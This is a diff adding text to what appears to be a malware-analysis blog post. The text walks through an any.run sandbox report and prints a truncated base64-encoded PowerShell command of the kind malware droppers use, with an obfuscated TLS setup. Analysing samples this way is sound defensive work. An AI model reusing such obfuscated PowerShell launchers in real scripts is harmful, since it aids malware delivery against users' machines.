@@ -77,4 +77,9 @@ https://app.any.run/tasks/800484d8-7d39-40ef-a4ac-3ba54481696b/
 ```
 ![alt text](https://Rayferrufino.github.io/assets/pic5.png "Logo Title Text 1")
 
+From the report we see a call to PowerShell with a long string of characters followed by a new binary being spawned.
 
+## This is a base64 encoded block in a request like the one below:
+```python
+>> powersheLL -e JABWAEgAVQBLAFEAZgBmAHcAPQAnAEEASABEAEoAQgByAGcAYgAnADsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAIgBzAEUAYABDAFUAUgBJAGAAVABZAFAAYABSAG8AdABvAGAAYwBvAEwAIgAgAD0AIAAnAHQAbABzADEAMgAsACAAdABsAHMAMQAxACwAIAB0AGwAcwAnADsAJABXAFEAUQBNAEQAcwBnAGEAIAA9ACAAJwA3ADEAMgAnADsAJABRAEwAUABF….
+```
